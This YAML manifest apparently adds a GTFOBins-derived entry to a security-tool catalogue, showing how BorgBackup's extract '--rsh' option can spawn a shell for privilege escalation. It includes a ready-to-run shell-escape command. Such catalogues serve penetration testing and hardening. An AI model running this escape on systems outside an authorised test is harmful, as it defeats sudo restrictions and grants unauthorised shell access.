---
id: backup-borg-borg
namespace: backup:borg:borg
name: borg
description: BorgBackup deduplicating backup tool, can spawn a shell via the extract command's rsh option.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs:
    - type: security.execution.context
      description: Sudo or unprivileged execution context
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 32
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 32
  network: none
  disk_io: low
allowed-tools:
  - borg
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "borg extract @:/:: --rsh 'shell_command'"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via borg extract rsh option
    command: |
      borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/borg/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "borgbackup"
    commands:
      - "apt-get install -y borgbackup"
---
